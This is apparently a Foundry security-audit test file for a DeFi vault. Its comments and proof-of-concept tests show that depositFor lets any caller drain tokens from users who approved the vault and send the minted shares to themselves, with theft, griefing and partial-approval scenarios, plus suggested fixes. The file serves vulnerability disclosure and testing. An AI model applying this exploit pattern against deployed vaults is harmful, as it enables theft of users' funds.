// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// ──────────────────────────────────────────────────────────────────────────────
// SPRINT SECURITY TEST — depositFor unauthorized payer allows fund theft
//
// VULNERABILITY SUMMARY
// ─────────────────────
// `ERC4626Module.depositFor(assets, receiver, payer)` accepts a caller-supplied
// `payer` address and passes it directly to `safeTransferFrom(payer, vault, assets)`.
//
//   // ERC4626Module.sol
//   function depositFor(uint256 assets, address receiver, address payer)
//       external returns (uint256 shares)
//   {
//       if (receiver == address(0)) revert ZeroAddress();
//       if (payer == address(0)) revert ZeroAddress();
//       return _depositInternal(assets, receiver, payer);   // ← no caller auth
//   }
//
//   // _depositInternal (line 481)
//   IERC20(_asset()).safeTransferFrom(payer, address(this), assets);  // ← uses vault allowance
//   _processorMint(receiver, shares + sharesFee);                      // ← shares go to receiver
//
// There is NO check that:
//   (a) msg.sender == payer, or
//   (b) msg.sender holds any vault-level or ERC20-level allowance from payer.
//
// The ERC20 approval is granted to the VAULT CONTRACT, not to a specific caller.
// Any EOA can therefore exploit any payer who has given the vault a standing
// (max or partial) token approval.
//
// ATTACK PATH:
//   1. Victim grants vault type(uint256).max USDC approval — standard UX.
//   2. Attacker calls depositFor(amount, attacker, victim):
//        → Vault pulls `amount` USDC from victim.
//        → Vault mints equivalent shares to attacker.
//   3. Attacker calls forceWithdrawAll(attacker):
//        → OpenEnded vault: no FM state gate, lock period bypassed by design.
//        → Burns attacker's shares, transfers assets minus force-exit penalty.
//
// With 0 % penalty: attacker receives 100 % of victim's stolen USDC.
// With 2 % penalty: attacker receives 98 % — still highly profitable theft.
// Pure griefing:    even if exit is unprofitable (high fees/lock), victim's
//                   funds are locked in the vault against her intent, at an
//                   arbitrary PPS and time of the attacker's choosing.
//
// IMPACT:
//   1. Any user with a standing vault approval is permanently at risk of theft.
//   2. The attack is O(1) and costs only gas — no capital required by attacker.
//   3. Victim's USDC flows directly to attacker; feeCollector receives fee cut.
//   4. Griefing path forces victims into vault at unfavorable times/PPS.
//
// FIX OPTIONS (any one):
//   A. Hard-require msg.sender == payer in depositFor:
//        if (msg.sender != payer) revert Unauthorized();
//   B. Maintain a vault-level caller allowance mapping:
//        mapping(address payer => mapping(address caller => uint256)) depositAllowance
//        and spend it in depositFor when msg.sender != payer.
//   C. Replace depositFor with depositWithPermit (EIP-2612) so the caller
//      authorisation is explicit, time-bounded, and non-replayable.
// ──────────────────────────────────────────────────────────────────────────────

import { Test } from "lib/forge-std/src/Test.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC20Metadata } from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

import { CoreHarness } from "../helpers/CoreHarness.sol";
import { MockUSDC } from "../helpers/MockUSDC.sol";
import { MockParamsProvider } from "../helpers/MockParamsProvider.sol";
import { ERC4626Module } from "../../src/core/modules/ERC4626Module.sol";

contract DepositFor_UnauthorizedPayer_POC is Test {
    // ── canonical addresses ───────────────────────────────────────────────────
    address constant USDC_UNDERLYING = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;

    // ── scale constants ───────────────────────────────────────────────────────
    uint256 constant ONE_MILLION_USDC = 1_000_000e6;

    // 2 % force-exit penalty — mirrors a realistic production config
    uint16 constant FORCE_PENALTY_BPS = 200;

    // ── actors ────────────────────────────────────────────────────────────────
    address internal victim;
    address internal attacker;

    // ── infra ─────────────────────────────────────────────────────────────────
    CoreHarness        internal core;
    MockUSDC           internal mock;
    MockParamsProvider internal params;

    // ─────────────────────────────────────────────────────────────────────────
    function setUp() public {
        victim   = makeAddr("victim");
        attacker = makeAddr("attacker");

        // 1. Etch MockUSDC at the canonical USDC address
        mock = new MockUSDC();
        vm.etch(USDC_UNDERLYING, address(mock).code);

        // 2. Deploy vault with all modules wired as ROLE_PUBLIC (test harness)
        params = new MockParamsProvider();
        core   = new CoreHarness(
            IERC20Metadata(USDC_UNDERLYING),
            "USDC Agg",
            "agUSDC",
            address(this), // owner
            address(this), // feeCollector / treasury
            address(params)
        );
    }

    // ── helpers ───────────────────────────────────────────────────────────────

    /// @dev Give victim USDC and a standing vault approval — standard UX pattern.
    function _victimApproves(uint256 amount) internal {
        MockUSDC(USDC_UNDERLYING).mint(victim, amount);
        vm.prank(victim);
        IERC20(USDC_UNDERLYING).approve(address(core), type(uint256).max);
    }

    // ═════════════════════════════════════════════════════════════════════════
    // TEST 1 — FULL THEFT (0 % fees, zero-penalty forceWithdrawAll)
    //
    // When no fees or force-exit penalty are configured, the attacker recovers
    // the full stolen amount. Victim receives nothing.
    //
    // End state:
    //   victim  USDC: 0           (lost everything)
    //   attacker USDC: 1 000 000  (gained everything)
    // ═════════════════════════════════════════════════════════════════════════
    function test_poc_full_theft_zero_fees() public {
        _victimApproves(ONE_MILLION_USDC);

        // Confirm: attacker holds no USDC and no vault shares before attack.
        assertEq(IERC20(USDC_UNDERLYING).balanceOf(attacker), 0, "pre: attacker USDC");
        assertEq(core.balanceOf(attacker), 0,                    "pre: attacker shares");

        // ── STEP 1: attacker deposits on behalf of victim, shares go to attacker ──
        vm.prank(attacker);
        uint256 sharesReceived = ERC4626Module(address(core)).depositFor(
            ONE_MILLION_USDC,
            attacker,   // ← receiver: attacker gets the shares
            victim      // ← payer: victim's USDC is pulled without her consent
        );

        assertGt(sharesReceived, 0, "attacker must receive shares");
        assertEq(core.balanceOf(attacker),                            sharesReceived, "attacker holds shares");
        assertEq(IERC20(USDC_UNDERLYING).balanceOf(address(core)),    ONE_MILLION_USDC, "vault has USDC");
        assertEq(IERC20(USDC_UNDERLYING).balanceOf(victim),           0,               "victim lost USDC");

        // ── STEP 2: attacker immediately exits — forceWithdrawAll bypasses lock ──
        vm.prank(attacker);
        uint256 recovered = ERC4626Module(address(core)).forceWithdrawAll(attacker);

        // ── ASSERTIONS ────────────────────────────────────────────────────────────
        // Attacker recovered the full 1 M USDC (no penalty configured).
        assertEq(
            recovered,
            ONE_MILLION_USDC,
            "BUG CONFIRMED: attacker recovered 100 % of victim's USDC"
        );

        // Attacker's wallet now holds stolen funds; shares are burned.
        assertEq(IERC20(USDC_UNDERLYING).balanceOf(attacker), ONE_MILLION_USDC, "attacker profit");
        assertEq(core.balanceOf(attacker),                    0,                "attacker shares burned");

        // Victim has nothing.
        assertEq(IERC20(USDC_UNDERLYING).balanceOf(victim), 0, "victim is left with nothing");
    }

    // ═════════════════════════════════════════════════════════════════════════
    // TEST 2 — PROFITABLE THEFT WITH PRODUCTION FEES (2 % force-exit penalty)
    //
    // Even with a 2 % force-exit penalty the attack is highly profitable.
    // The attacker pays 20 000 USDC to the feeCollector and nets 980 000 USDC —
    // a 100 % return on zero capital deployed.
    //
    // End state:
    //   victim    USDC: 0           (lost 1 000 000 USDC)
    //   attacker  USDC: ~980 000    (gained net 980 000 USDC at zero cost)
    //   feeCollector shares: >0     (captured ~20 000 USDC worth of fee shares)
    // ═════════════════════════════════════════════════════════════════════════
    function test_poc_profitable_theft_with_force_penalty() public {
        // Set a realistic 2 % force-exit penalty (200 bps).
        core.setExitFeesUnsafe(0, 0, FORCE_PENALTY_BPS);

        _victimApproves(ONE_MILLION_USDC);

        uint256 feeCollectorSharesBefore = core.balanceOf(address(this));

        // ── STEP 1: attacker deposits via victim's approval ───────────────────────
        vm.prank(attacker);
        ERC4626Module(address(core)).depositFor(ONE_MILLION_USDC, attacker, victim);

        assertEq(IERC20(USDC_UNDERLYING).balanceOf(victim), 0, "victim lost USDC");

        // ── STEP 2: attacker exits with force-withdraw ────────────────────────────
        vm.prank(attacker);
        uint256 recovered = ERC4626Module(address(core)).forceWithdrawAll(attacker);

        uint256 feeCollectorSharesAfter = core.balanceOf(address(this));
        uint256 feesCollected = feeCollectorSharesAfter - feeCollectorSharesBefore;

        // Attacker's net is less than 1 M but still overwhelmingly profitable
        // (2 % penalty on 1 M = 20 k USDC lost to fees, 980 k USDC net profit).
        assertGt(
            recovered,
            900_000e6,
            "BUG CONFIRMED: attacker retains over 900 000 USDC of victim's funds despite penalty"
        );
        assertLt(recovered, ONE_MILLION_USDC, "penalty applied: attacker received less than stolen");

        // feeCollector captured the penalty cut.
        assertGt(feesCollected, 0, "feeCollector received fee shares from the attack");

        // Approximate fee value: ~2 % of 1 M = ~20 000 USDC.
        uint256 vaultBal    = IERC20(USDC_UNDERLYING).balanceOf(address(core));
        uint256 totalShares = core.totalSupply();
        uint256 feeValueApprox = totalShares > 0 ? feesCollected * vaultBal / totalShares : 0;
        assertGt(feeValueApprox, 10_000e6, "feeCollector captured at least 10 000 USDC in fees");

        // Victim still holds nothing.
        assertEq(IERC20(USDC_UNDERLYING).balanceOf(victim), 0, "victim receives nothing");
    }

    // ═════════════════════════════════════════════════════════════════════════
    // TEST 3 — GRIEFING: forced deposit without profitable exit
    //
    // Even when fees make an immediate exit unprofitable for the attacker,
    // the victim is still harmed: her USDC is locked in the vault against her
    // will at an arbitrary time chosen by the attacker. The victim cannot exit
    // cheaply and is exposed to vault risk she never opted into.
    //
    // Scenario: 5 % withdrawal fee + 2 % force penalty → attacker loses 7 %
    // on exit, making immediate theft unprofitable. But victim's USDC is still
    // locked in the vault and she cannot recover it without paying exit fees.
    // ═════════════════════════════════════════════════════════════════════════
    function test_poc_griefing_victim_funds_locked_without_consent() public {
        // High fee configuration — immediate exit is unprofitable for attacker.
        // witBps=500 (5 %), forceExitPenalty=200 (2 %) → 7 % total penalty.
        core.setExitFeesUnsafe(500, 0, 200);

        _victimApproves(ONE_MILLION_USDC);

        uint256 victimUsdcBefore = IERC20(USDC_UNDERLYING).balanceOf(victim);

        // ── STEP 1: attacker deposits on behalf of victim ─────────────────────────
        // (Attacker doesn't care about the exit — goal is to grief the victim)
        vm.prank(attacker);
        ERC4626Module(address(core)).depositFor(ONE_MILLION_USDC, attacker, victim);

        // Victim's USDC is gone from her wallet — locked in vault without consent.
        uint256 victimUsdcAfter = IERC20(USDC_UNDERLYING).balanceOf(victim);
        assertEq(
            victimUsdcBefore - victimUsdcAfter,
            ONE_MILLION_USDC,
            "BUG: victim's USDC was pulled from her wallet without her initiating a deposit"
        );

        // Shares went to attacker, not victim.
        assertGt(core.balanceOf(attacker), 0, "attacker holds shares from victim's USDC");
        assertEq(core.balanceOf(victim),   0, "victim holds no shares despite her USDC being taken");

        // The victim must now pay exit fees to retrieve even a fraction of her USDC:
        // she owns no shares (they went to attacker), so she cannot exit at all
        // through normal paths.  Her only recourse is to have provided approval to
        // a third party, which she has no on-chain mechanism to revoke retroactively
        // for a deposit that has already settled.
        assertEq(
            core.balanceOf(victim),
            0,
            "BUG: victim has no shares - she cannot exit or retrieve her locked USDC"
        );
    }

    // ═════════════════════════════════════════════════════════════════════════
    // TEST 4 — CONTROL: standard deposit() cannot be weaponised this way
    //
    // The standard deposit(assets, receiver) ALWAYS pulls from msg.sender.
    // An attacker calling deposit() is forced to use their own USDC and cannot
    // use victim's balance. This confirms the vulnerability is specific to the
    // missing authorisation check in depositFor().
    // ═════════════════════════════════════════════════════════════════════════
    function test_control_standard_deposit_cannot_steal_victim_usdc() public {
        _victimApproves(ONE_MILLION_USDC);

        uint256 victimBefore   = IERC20(USDC_UNDERLYING).balanceOf(victim);
        uint256 attackerBefore = IERC20(USDC_UNDERLYING).balanceOf(attacker);

        // Attacker calls deposit() — but deposit() pulls from msg.sender (attacker).
        // Since attacker has no USDC, this reverts due to insufficient balance.
        vm.prank(attacker);
        vm.expectRevert(); // ERC20 transfer failure — attacker has no USDC
        ERC4626Module(address(core)).deposit(ONE_MILLION_USDC, attacker);

        // Victim's USDC is untouched.
        assertEq(IERC20(USDC_UNDERLYING).balanceOf(victim),   victimBefore,   "victim USDC unchanged");
        assertEq(IERC20(USDC_UNDERLYING).balanceOf(attacker), attackerBefore, "attacker USDC unchanged");
        assertEq(core.balanceOf(attacker), 0, "attacker received no shares");
    }

    // ═════════════════════════════════════════════════════════════════════════
    // TEST 5 — PARTIAL APPROVAL: attack bounded by victim's granted allowance
    //
    // Even if the victim has only approved a non-max amount (e.g., 100 000 USDC),
    // the attacker can drain that exact approved amount in a single call.
    // The 1:1 nature of ERC20 approval means every approval grants instant risk.
    // ═════════════════════════════════════════════════════════════════════════
    function test_poc_partial_approval_is_also_exploitable() public {
        uint256 partialApproval = 100_000e6; // victim approved only 100 k

        // Mint victim 1 M USDC but approve only 100 k.
        MockUSDC(USDC_UNDERLYING).mint(victim, ONE_MILLION_USDC);
        vm.prank(victim);
        IERC20(USDC_UNDERLYING).approve(address(core), partialApproval);

        // Victim has 1 M but only 100 k is at risk.
        assertEq(
            IERC20(USDC_UNDERLYING).allowance(victim, address(core)),
            partialApproval
        );

        // Attacker drains exactly the approved amount.
        vm.prank(attacker);
        ERC4626Module(address(core)).depositFor(partialApproval, attacker, victim);

        // 100 k stolen; remaining 900 k is safe (approval exhausted).
        assertEq(
            IERC20(USDC_UNDERLYING).balanceOf(victim),
            ONE_MILLION_USDC - partialApproval,
            "BUG: attacker drained exactly the victim's approved allowance"
        );
        assertGt(core.balanceOf(attacker), 0, "attacker holds shares from stolen USDC");

        // Allowance is now zero — a second attack on the same approval fails.
        vm.prank(attacker);
        vm.expectRevert();
        ERC4626Module(address(core)).depositFor(1e6, attacker, victim);
    }
}
